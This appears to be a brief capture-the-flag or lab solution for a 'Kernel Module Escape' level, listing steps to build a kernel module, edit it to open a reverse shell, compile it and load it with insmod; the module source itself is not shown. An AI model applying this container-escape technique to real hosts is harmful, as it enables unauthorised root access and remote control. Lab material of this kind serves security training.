SOLUTION — Level 5: Kernel Module Escape

# Build the module against the host kernel headers
cd /root/module

# Update the command to give you a reverse shell then compile
make

# Load the module
insmod module.ko

